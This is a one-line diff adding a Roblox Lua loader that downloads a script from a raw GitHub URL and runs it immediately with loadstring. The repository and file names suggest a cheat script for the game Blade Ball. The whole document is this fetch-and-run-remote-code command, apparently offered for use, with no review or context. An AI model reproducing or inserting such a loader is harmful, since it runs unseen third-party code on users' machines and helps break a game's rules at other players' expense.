@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/r4mpage4/7Scripts/main/BladeBalls"))();  
